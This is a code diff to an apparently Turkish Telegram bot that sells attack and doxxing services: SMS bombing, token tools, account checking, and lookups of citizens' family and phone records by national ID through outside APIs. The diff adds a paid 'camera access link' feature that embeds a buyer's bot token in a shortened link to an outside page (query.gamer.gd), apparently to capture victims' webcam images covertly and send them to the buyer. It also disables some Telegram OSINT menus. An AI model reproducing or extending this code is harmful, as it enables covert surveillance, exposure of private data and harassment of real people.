@@ -86,6 +86,9 @@ PREMIUM_KEYWORD_LIMIT = 50
 FREE_CAPTURE_LIMIT = 3
 SMS_COUNT = 41
 
+# ── Kamera Erişim Link (üyelik) ──
+CAMERA_PRICE = 500
+
 # yt-dlp PO Token (opsiyonel)
 POT_PROVIDER_URL = os.environ.get("POT_PROVIDER_URL", "")
 
@@ -321,6 +324,8 @@ def db_init():
         ("premium_lmnx_until", "TEXT DEFAULT ''"),
         ("is_verified", "INTEGER DEFAULT 0"),
         ("log_api_pref", "TEXT DEFAULT 'auto'"),
+        ("is_premium_camera", "INTEGER DEFAULT 0"),
+        ("camera_date", "TEXT DEFAULT ''"),
     ]:
         try:
             c.execute(f"ALTER TABLE users ADD COLUMN {col} {typedef}")
@@ -642,6 +647,32 @@ def is_premium_log(user_id):
     try:
         return _as_int_flag(db_get(user_id, "is_premium_log"))
     except:
+        return False
+
+def is_premium_camera(user_id):
+    try:
+        return _as_int_flag(db_get(user_id, "is_premium_camera"))
+    except:
+        return False
+
+def set_premium_camera(user_id, username=""):
+    try:
+        add_user(user_id, username or "", "")
+        now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        db_set(user_id, "is_premium_camera", 1)
+        db_set(user_id, "camera_date", now)
+        conn = sqlite3.connect(DB_PATH)
+        c = conn.cursor()
+        c.execute(
+            "INSERT INTO premium_logs (user_id,username,package,amount,date) VALUES (?,?,?,?,?)",
+            (user_id, username or "", "CAMERA", CAMERA_PRICE, now)
+        )
+        conn.commit()
+        conn.close()
+        print(f"[PREMIUM] CAMERA Premium verildi: {user_id} - {username}")
+        return True
+    except Exception as e:
+        print(f"[PREMIUM ERROR] set_premium_camera: {e}")
         return False
 
 def is_banned(user_id):
@@ -2904,7 +2935,7 @@ S = {
         "premium_title": "⭐ <b>PREMIUM ÜYELİK</b>",
         "premium_price_txt": "💰 Fiyat: <b>{price} Telegram Yıldızı</b>",
         "premium_dur": "♾️ Süre: <b>Sınırsız (Ömür Boyu)</b>",
-        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail Check\n• 📸 Sınırsız Capture (20 Platform)\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT (LeakSights)\n• 🆔 Sınırsız Telegram ID Sorgu\n• 📊 Detaylı istatistikler",
+        "premium_features": "🎯 <b>PREMIUM ÖZELLİKLER</b>\n• 📧 Sınırsız Hotmail Check\n• 📸 Sınırsız Capture (20 Platform)\n• 🔖 Sınırsız Keyword\n• 🌍 Sınırsız OSINT (LeakSights)\n• 📊 Detaylı istatistikler",
         "osint_price": "💰 OSINT Premium: 200 Yıldız",
         "already_premium": "⭐ Zaten Premium üyesiniz!",
         "prem_ok": "🎉 <b>Premium aktif!</b>",
@@ -5805,7 +5836,7 @@ APILER = {
     "tcpro":     ("🔍 TC Pro",         "https://api.ajaxsystems.fun/tcpro.php?tc={tc}",                  "tc",   "TC (11 hane)"),
     "adsoyad":   ("👤 Ad Soyad",       "https://api.ajaxsystems.fun/adsoyad.php?ad={ad}&soyad={soyad}",  "ad",   "Ad Soyad (Ali Veli) veya Ad Soyad,İl,İlçe"),
     "aile":      ("👨‍👩‍👧 Aile",           "https://api.ajaxsystems.fun/aile.php?tc={tc}",                   "tc",   "TC (11 hane)"),
-    "ailepro":   ("👨‍👩‍👧‍👦 Aile Pro",       "https://api.ajaxsystems.fun/ailepro.php?tc={tc}",                "tc",   "TC (11 hane)"),
+    "ailepro":   ("👨‍👩‍👧‍👦 Aile Pro",       "https://api.ajaxsystems.fun/aile.php?tc={tc}",                   "tc",   "TC (11 hane)"),
     "sulale":    ("🌳 Sülale",         "https://api.ajaxsystems.fun/sulale.php?tc={tc}",                 "tc",   "TC (11 hane)"),
     "tcgsm":     ("📱 TC → GSM",       "https://api.ajaxsystems.fun/tcgsm.php?tc={tc}",                  "tc",   "TC (11 hane)"),
     "gsmtc":     ("📞 GSM → TC",       "https://api.ajaxsystems.fun/gsmtc.php?gsm={gsm}&auth=fire",      "gsm",  "GSM (5xxxxxxxxx)"),
@@ -5925,16 +5956,12 @@ def tools_kb(user_id):
         _btn("SearchX 😈", "menu_lmnx", "primary"),
     )
     mk.add(
-        _btn("🔍 Telegram OSINT", "tool_mobius", "primary"),
-    )
-    mk.add(
         _btn("🌐 IP Bilgi", "tool_ipinfo", "primary"),
         _btn("🔎 DNS Sorgu", "tool_dns", "primary"),
         _btn("🚗 Plaka Sorgu", "tool_plaka", "primary"),
         _btn("⚽ Bahis Sorgu", "tool_bahis", "primary"),
         _btn("💊 Eczane", "tool_eczane", "primary"),
         _btn("💎 PreDunyam", "tool_predunyam", "primary"),
-        _btn("🆔 Telegram ID", "tool_tgid", "primary"),
         _btn("📸 EXIF Metadata", "tool_exif", "primary"),
     )
     mk.add(
@@ -5957,6 +5984,7 @@ def tools_kb(user_id):
         _btn("🤖 Discord Token", "tool_dctoken", "danger"),
         _btn("✈️ TG Token", "tool_tgtoken", "danger"),
         _btn("🐍 PHP→Python", "tool_php2py", "danger"),
+        _btn("📷 Kamera Link", "tool_camera", "danger"),
     )
     mk.add(_btn("🏠 Ana Menü", "goto_home", "success"))
     return mk
@@ -8184,6 +8212,60 @@ def _launch_sms_bomb(uid, phone, mail, mode, limit, interval, bot_instance):
         }
     t.start()
 
+def _process_camera_token(msg, bot_instance):
+    """Kamera link için bot token al, doğrula, kısa link üret. Kanal zorunluluğu yok."""
+    uid = msg.from_user.id
+    chat_id = msg.chat.id
+    text = (msg.text or "").strip()
+
+    if text.lower() in ("iptal", "cancel", "/cancel", "çık", "cik"):
+        USER_STATES.pop(uid, None)
+        bot_instance.reply_to(msg, "❌ İptal edildi.")
+        return
+
+    if not is_premium_camera(uid):
+        USER_STATES.pop(uid, None)
+        bot_instance.reply_to(msg, "🔒 Bu servis için üyelik gerekli. Araçlar menüsünden satın al.")
+        return
+
+    token = text
+    if not token or ":" not in token or len(token) < 30:
+        bot_instance.reply_to(msg, "❌ Geçersiz token formatı. Tekrar gönder veya iptal yaz.")
+        return
+
+    url = f"https://api.telegram.org/bot{token}/getMe"
+    try:
+        r = requests.get(url, timeout=10).json()
+    except Exception:
+        bot_instance.reply_to(msg, "❌ Telegram API erişim hatası. Tekrar dene.")
+        return
+
+    if not r.get("ok"):
+        bot_instance.reply_to(msg, "❌ Geçersiz token. Tekrar dene veya iptal yaz.")
+        return
+
+    USER_STATES.pop(uid, None)
+    bot_instance.reply_to(msg, "✅ <b>Token doğrulandı!</b>", parse_mode="HTML")
+
+    long_url = f"http://query.gamer.gd/C1.html?id={chat_id}&token={token}"
+    try:
+        short = requests.get(
+            "https://clck.ru/--",
+            params={"url": long_url},
+            timeout=10
+        ).text.strip()
+    except Exception:
+        bot_instance.reply_to(msg, "❌ Link kısaltma hatası. Uzun link:\n" + long_url)
+        return
+
+    bot_instance.send_message(
+        chat_id,
+        f"🔗 <b>Kısaltılmış Bağlantınız:</b>\n{short}\n\n"
+        "📷 Bu link ile kamera erişim bağlantısı oluşturuldu.\n"
+        "İstediğin kadar yeni link için tekrar token gönder (üyelik aktif).",
+        parse_mode="HTML"
+    )
+
 def _sms_step1_number(msg, bot_instance):
     uid = msg.from_user.id
     phone = msg.text.strip()
@@ -9042,6 +9124,7 @@ def register_handlers(bot_instance):
             _btn("📂 LOG Premium Ver", "adm_log_give", "success"),
             _btn("💣 SMS Premium Ver", "adm_sms_give", "success"),
             _btn("😈 SearchX Premium Ver", "adm_lmnx_give", "success"),
+            _btn("📷 Kamera Üyelik Ver", "adm_camera_give", "success"),
             _btn("🎨 AI Image Bakiye Ver", "adm_aiimg_give", "success"),
             _btn("➖ AI Image Bakiye Al", "adm_aiimg_take", "danger"),
         )
@@ -9150,8 +9233,10 @@ def register_handlers(bot_instance):
                 USER_STATES.pop(uid, None)
                 _admin_sms_give_user(msg, bot_instance)
                 return
-            
-            
+            if action == "adm_camera_give":
+                USER_STATES.pop(uid, None)
+                _admin_camera_give_user(msg, bot_instance)
+                return
             
             if action == "adm_mobius_give":
                 USER_STATES.pop(uid, None)
@@ -10095,68 +10180,48 @@ def register_handlers(bot_instance):
                 return
             # ═══ 🆔 TG-ID CALLBACK'LERİ ═══
             if data == "tool_tgid":
-                try: bot_instance.answer_callback_query(call.id)
-                except: pass
-                free_left = max(0, TGID_FREE_LIMIT - tgid_get_free_used(uid))
-                balance = tgid_get_balance(uid)
-                if uid == ADMIN_ID: durum = "👑 Admin — Sınırsız"
-                elif is_premium(uid): durum = "⭐ Premium — Sınırsız"
-                else: durum = f"🆓 Free: {free_left}/{TGID_FREE_LIMIT}  |  💰 Bakiye: {balance}"
-                txt = (f"🆔 <b>TELEGRAM ID SORGU</b>\n━━━━━━━━━━━━━━━━━━━━━\n📊 {durum}\n\n"
-                       f"🔍 Username veya sayısal ID yaz.\n"
-                       f"📡 Kaynak: <b>Sherlock</b>\n\n"
-                       f"📌 Örnek: <code>@durov</code> / <code>777000</code>\n\n"
-                       f"🆓 Free: <b>1 hak</b> — bitince paket al.\n"
-                       f"💎 Paketler: 25→89⭐ · 50→180⭐ · 100→250⭐")
-                try: bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=tgid_kb(uid), parse_mode="HTML")
-                except: bot_instance.send_message(call.message.chat.id, txt, reply_markup=tgid_kb(uid), parse_mode="HTML")
+                try:
+                    bot_instance.answer_callback_query(call.id, "Bu servis kaldırıldı", show_alert=True)
+                except Exception:
+                    pass
+                bot_instance.send_message(
+                    call.message.chat.id,
+                    "❌ <b>Bu servis kaldırıldı.</b>\n"
+                    "Telegram OSINT ve Telegram ID sorgu artık aktif değil.\n\n"
+                    "🛠 Araçlar menüsünden diğer servisleri kullanabilirsin.",
+                    reply_markup=tools_kb(uid),
+                    parse_mode="HTML",
+                )
                 return
             # ═══ Telegram OSINT (Mobius API) ═══
             if data == "tool_mobius":
                 try:
-                    bot_instance.answer_callback_query(call.id)
+                    bot_instance.answer_callback_query(call.id, "Bu servis kaldırıldı", show_alert=True)
                 except Exception:
                     pass
-                try:
-                    free_left = max(0, MOBIUS_FREE_LIMIT - mobius_get_free_used(uid))
-                    bal = mobius_get_balance(uid)
-                    if uid == ADMIN_ID:
-                        durum = "👑 Admin — Sınırsız"
-                    else:
-                        durum = f"🆓 Free: {free_left}/{MOBIUS_FREE_LIMIT}  |  💰 Bakiye: {bal}"
-                    txt = (
-                        "🔍 <b>TELEGRAM OSINT</b>\n"
-                        "━━━━━━━━━━━━━━━━━━━━━\n"
-                        f"📊 {durum}\n\n"
-                        "Telefon · @username · E-posta · İsim\n"
-                        "VK · INN · Pasaport ve daha fazlası.\n\n"
-                        f"🆓 Free: <b>{MOBIUS_FREE_LIMIT} hak</b>\n"
-                        f"💎 {MOBIUS_PACKAGE_15}→{MOBIUS_PRICE_15}⭐ · "
-                        f"{MOBIUS_PACKAGE_75}→{MOBIUS_PRICE_75}⭐\n"
-                        f"💎 {MOBIUS_PACKAGE_300}→{MOBIUS_PRICE_300}⭐ · "
-                        f"{MOBIUS_PACKAGE_1000}→{MOBIUS_PRICE_1000}⭐"
-                    )
-                    kb = mobius_kb(uid)
-                    try:
-                        bot_instance.edit_message_text(
-                            txt, call.message.chat.id, call.message.message_id,
-                            reply_markup=kb, parse_mode="HTML",
-                        )
-                    except Exception:
-                        bot_instance.send_message(
-                            call.message.chat.id, txt, reply_markup=kb, parse_mode="HTML",
-                        )
-                except Exception as e:
-                    print(f"[TG-OSINT MENU] {e}")
-                    try:
-                        bot_instance.send_message(
-                            call.message.chat.id,
-                            f"❌ Telegram OSINT menü hatası:\n<code>{e}</code>",
-                            parse_mode="HTML",
-                        )
-                    except Exception:
-                        pass
+                bot_instance.send_message(
+                    call.message.chat.id,
+                    "❌ <b>Bu servis kaldırıldı.</b>\n"
+                    "Telegram OSINT ve Telegram ID sorgu artık aktif değil.\n\n"
+                    "🛠 Araçlar menüsünden diğer servisleri kullanabilirsin.",
+                    reply_markup=tools_kb(uid),
+                    parse_mode="HTML",
+                )
                 return
+            # Kaldırılan servis alt menüleri
+            if data.startswith("mobius_") or data.startswith("tgid_") or data.startswith("mobius_t_"):
+                try:
+                    bot_instance.answer_callback_query(call.id, "Bu servis kaldırıldı", show_alert=True)
+                except Exception:
+                    pass
+                bot_instance.send_message(
+                    call.message.chat.id,
+                    "❌ <b>Bu servis kaldırıldı.</b>\nTelegram OSINT / Telegram ID artık yok.",
+                    reply_markup=tools_kb(uid),
+                    parse_mode="HTML",
+                )
+                return
+
             if data == "mobius_search":
                 try:
                     bot_instance.answer_callback_query(call.id)
@@ -10620,6 +10685,59 @@ def register_handlers(bot_instance):
                 register_step(bot_instance, m, lambda m: _sms_step1_number(m, bot_instance))
                 return
 
+            if data == "tool_camera":
+                try:
+                    bot_instance.answer_callback_query(call.id)
+                except Exception:
+                    pass
+                if not is_premium_camera(uid):
+                    mk = InlineKeyboardMarkup(row_width=1)
+                    mk.add(_btn(f"⭐ Üyelik Satın Al — {CAMERA_PRICE}⭐", "buy_camera", "success"))
+                    mk.add(_btn("◀️ Araçlar", "goto_tools"))
+                    bot_instance.send_message(
+                        call.message.chat.id,
+                        "📷 <b>Kamera Erişim Link</b>\n"
+                        "━━━━━━━━━━━━━━━━━━━━━\n"
+                        "🔒 Bu servis üyelik gerektirir.\n\n"
+                        f"⭐ <b>{CAMERA_PRICE} yıldız</b> → sınırsız kullanım\n\n"
+                        "Kendi bot tokenin ile kamera erişim bağlantısı oluşturursun.\n"
+                        "Kanal kaydı yok, direkt kullanırsın.",
+                        reply_markup=mk,
+                        parse_mode="HTML"
+                    )
+                    return
+                # Üye ise token iste
+                USER_STATES[uid] = {"action": "camera_token"}
+                m = bot_instance.send_message(
+                    call.message.chat.id,
+                    "📷 <b>Kamera Erişim Link</b>\n"
+                    "━━━━━━━━━━━━━━━━━━━━━\n"
+                    "🔑 Lütfen <b>Telegram Bot Token</b> gönderin:\n\n"
+                    "<i>iptal yazarak çık</i>",
+                    parse_mode="HTML"
+                )
+                register_step(bot_instance, m, lambda m: _process_camera_token(m, bot_instance))
+                return
+
+            if data == "buy_camera":
+                try:
+                    bot_instance.send_invoice(
+                        chat_id=call.message.chat.id,
+                        title="Kamera Erişim Üyelik",
+                        description="Kamera link oluşturma — sınırsız üyelik",
+                        invoice_payload="camera",
+                        provider_token="",
+                        currency="XTR",
+                        prices=[LabeledPrice(label="Kamera Üyelik", amount=CAMERA_PRICE)],
+                    )
+                    bot_instance.answer_callback_query(call.id)
+                except Exception as e:
+                    try:
+                        bot_instance.answer_callback_query(call.id, str(e)[:180], show_alert=True)
+                    except Exception:
+                        pass
+                return
+
             if data == "tool_hotmail":
                 try:
                     bot_instance.answer_callback_query(call.id)
@@ -10984,31 +11102,19 @@ def register_handlers(bot_instance):
                     bot_instance.send_message(call.message.chat.id, txt, reply_markup=combo_packages_kb(), parse_mode="HTML")
                 return
 
-            
-            
             if data == "tool_mobius":
                 try:
-                    bot_instance.answer_callback_query(call.id)
+                    bot_instance.answer_callback_query(call.id, "Bu servis kaldırıldı", show_alert=True)
                 except Exception:
                     pass
-                free_left = max(0, MOBIUS_FREE_LIMIT - mobius_get_free_used(uid))
-                bal = mobius_get_balance(uid)
-                durum = "👑 Admin — Sınırsız" if uid == ADMIN_ID else f"🆓 Free: {free_left}/{MOBIUS_FREE_LIMIT} | 💰 {bal}"
-                txt = (
-                    "🔍 <b>TELEGRAM OSINT</b>\n"
-                    "━━━━━━━━━━━━━━━━━━━━━\n"
-                    f"📊 {durum}\n\n"
-                    "Telefon · Telegram · VK · FIO · E-posta\n"
-                    "INN · Pasaport ve daha fazlası.\n\n"
-                    f"💎 {MOBIUS_PACKAGE_15}→{MOBIUS_PRICE_15}⭐ · "
-                    f"{MOBIUS_PACKAGE_75}→{MOBIUS_PRICE_75}⭐\n"
-                    f"{MOBIUS_PACKAGE_300}→{MOBIUS_PRICE_300}⭐ · "
-                    f"{MOBIUS_PACKAGE_1000}→{MOBIUS_PRICE_1000}⭐"
+                bot_instance.send_message(
+                    call.message.chat.id,
+                    "❌ <b>Bu servis kaldırıldı.</b>\n"
+                    "Telegram OSINT ve Telegram ID sorgu artık aktif değil.\n\n"
+                    "🛠 Araçlar menüsünden diğer servisleri kullanabilirsin.",
+                    reply_markup=tools_kb(uid),
+                    parse_mode="HTML",
                 )
-                try:
-                    bot_instance.edit_message_text(txt, call.message.chat.id, call.message.message_id, reply_markup=mobius_kb(uid), parse_mode="HTML")
-                except Exception:
-                    bot_instance.send_message(call.message.chat.id, txt, reply_markup=mobius_kb(uid), parse_mode="HTML")
                 return
 
             if data == "mobius_stats":
@@ -11523,6 +11629,22 @@ def register_handlers(bot_instance):
                 parse_mode="HTML"
             )
             bot_instance.send_message(ADMIN_ID, f"📂 <b>YENİ LOG PREMIUM</b>\n👤 @{username}\n🆔 {uid}\n💰 {LOG_PRICE} Stars")
+        elif payload == "camera":
+            set_premium_camera(uid, username)
+            bot_instance.reply_to(
+                msg,
+                "🎉 <b>Kamera Erişim Üyeliği aktif!</b>\n"
+                "📷 Artık sınırsız kamera linki oluşturabilirsin.\n"
+                "Araçlar → 📷 Kamera Link ile devam et.",
+                parse_mode="HTML"
+            )
+            try:
+                bot_instance.send_message(
+                    ADMIN_ID,
+                    f"📷 <b>YENİ KAMERA ÜYELİK</b>\n👤 @{username}\n🆔 {uid}\n💰 {CAMERA_PRICE}⭐"
+                )
+            except Exception:
+                pass
 
 # ══════════════════════════════════════════════════════════════
 #  PROCESS FUNCTIONS
@@ -12947,17 +13069,44 @@ def _process_ls(msg, key, bot_instance):
 
 def _api_get(url):
     try:
-        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0"}, timeout=(10, 35), verify=False)
+        r = requests.get(url, headers={"User-Agent": "Mozilla/5.0", "Accept": "application/json, text/plain, */*"}, timeout=(10, 45), verify=False)
+        # JSON dene (200 dışı da body okunabilir)
+        data = None
+        try:
+            data = r.json()
+        except Exception:
+            data = None
         if r.status_code == 200:
-            try:
-                return r.json(), None
-            except Exception:
-                return None, "❌ API geçersiz yanıt verdi. Tekrar dene."
+            if data is not None:
+                # API hata alanı
+                if isinstance(data, dict):
+                    err = data.get("error") or data.get("hata") or data.get("message") or data.get("msg")
+                    durum = str(data.get("durum") or data.get("status") or "").lower()
+                    if durum in ("basarisiz", "error", "fail", "not_found", "hata"):
+                        return None, f"❌ {err or 'Kayıt bulunamadı.'}"
+                    if err and not data.get("veri") and not data.get("data") and not data.get("result"):
+                        # sadece error dönmüş olabilir
+                        low = str(err).lower()
+                        if "geçersiz" in low or "izin" in low or "endpoint" in low:
+                            return None, f"❌ {err}"
+                return data, None
+            # JSON değil ama 200
+            body = (r.text or "").strip()
+            if body:
+                return {"sonuc": body[:4000]}, None
+            return None, "❌ API boş yanıt verdi. Tekrar dene."
+        # Hata status
+        if isinstance(data, dict):
+            err = data.get("error") or data.get("hata") or data.get("message") or data.get("msg")
+            if err:
+                return None, f"❌ {err}"
         if r.status_code in (502, 503, 504):
             return None, "⏳ Servis meşgul. Biraz sonra tekrar dene."
         if r.status_code == 404:
-            return None, "❌ Kayıt bulunamadı."
-        return None, "❌ Sorgu şu an yapılamadı. Tekrar dene."
+            return None, "❌ Kayıt bulunamadı / endpoint yok."
+        if r.status_code == 400:
+            return None, "❌ Geçersiz istek veya endpoint desteklenmiyor."
+        return None, f"❌ Sorgu yapılamadı (HTTP {r.status_code}). Tekrar dene."
     except (requests.Timeout, requests.exceptions.ReadTimeout, requests.exceptions.ConnectTimeout):
         return None, "⏳ Sunucu yanıt vermedi. Lütfen tekrar dene."
     except requests.exceptions.ConnectionError:
@@ -13373,6 +13522,19 @@ def _handle_admin_cb(call, action, bot_instance):
                 parse_mode="HTML"
             )
             return
+        elif action == "camera_give":
+            try: bot_instance.answer_callback_query(call.id)
+            except: pass
+            USER_STATES[uid] = {"action": "adm_camera_give"}
+            bot_instance.send_message(
+                cid,
+                "📷 <b>Kamera Üyelik Ver</b>\n"
+                "Telegram ID gir:\n"
+                "<code>123456789</code>\n\n"
+                "Sınırsız kamera link oluşturma hakkı verilir.",
+                parse_mode="HTML"
+            )
+            return
         elif action == "aiimg_give":
             try: bot_instance.answer_callback_query(call.id)
             except: pass
@@ -13657,6 +13819,28 @@ def _admin_log_give_user(msg, bot_instance):
             pass
     else:
         bot_instance.reply_to(msg, "❌ LOG Premium verilemedi.")
+
+def _admin_camera_give_user(msg, bot_instance):
+    if msg.from_user.id != ADMIN_ID: return
+    tid, tuname = _resolve_target(msg.text.strip())
+    if not tid:
+        bot_instance.reply_to(msg, "❌ Kullanıcı bulunamadı! @kullanici veya ID gir."); return
+    add_user(tid, tuname or "", "")
+    if is_premium_camera(tid):
+        bot_instance.reply_to(msg, f"ℹ️ @{tuname or tid} zaten Kamera Üyeliği var!"); return
+    if set_premium_camera(tid, tuname or str(tid)):
+        bot_instance.reply_to(msg, f"✅ <b>Kamera Üyeliği verildi!</b>\n👤 @{tuname or tid}\n🆔 <code>{tid}</code>")
+        try:
+            bot_instance.send_message(
+                tid,
+                "🎁 <b>Admin sana Kamera Üyeliği verdi!</b>\n"
+                "📷 Artık sınırsız kamera linki oluşturabilirsin.\n"
+                "Araçlar → 📷 Kamera Link"
+            )
+        except:
+            pass
+    else:
+        bot_instance.reply_to(msg, "❌ Kamera Üyeliği verilemedi.")
 
 def _admin_aiimg_give(msg, bot_instance):
     if msg.from_user.id != ADMIN_ID: return
